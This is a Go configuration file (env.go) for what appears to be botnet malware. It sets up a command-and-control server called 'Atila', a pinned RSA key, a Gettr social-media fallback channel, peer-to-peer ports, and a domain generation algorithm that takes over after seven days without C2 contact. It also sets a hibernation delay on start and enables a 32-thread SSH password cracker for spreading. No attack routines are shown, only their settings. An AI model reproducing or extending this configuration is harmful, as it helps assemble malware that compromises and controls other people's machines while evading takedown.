package main

import "crypto/rsa"

// RENAME INTO: env.go

// Main loop configuration.
var maxLoopWait int = 10
var minLoopWait int = 5

// Atila is a back-end command & control server.
var atilaHost string = "http://localhost:60666"

// Trusted public key.
var trustedPublicKeyPEM string = "-----BEGIN PUBLIC KEY-----\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n-----END PUBLIC KEY-----\n"
var trustedPublicKey *rsa.PublicKey = importPEMPublicKey(trustedPublicKeyPEM)

// Gettr fallback channel profile name.
var gettrProfileName string = ""

// Peer 2 Peer configuration.
var peerPort string = "6006"

// Domain Generation Algorithm configuration.
var dgaSeed = 123

// DGA should kick in after X amount of days since the last successful contact with Atila. (cnc)
var dgaAfterDays = 7

// Sleep on start.
var hybernate bool = true

// In minutes:
var hybernateMin int = 10
var hybernateMax int = 15

// SSH Cracker configuration.

// Enables or disables the SSH cracking.
var enableSshCracker bool = true

// A number of GO threads which will run the crackers.
var sshThreads uint = 32
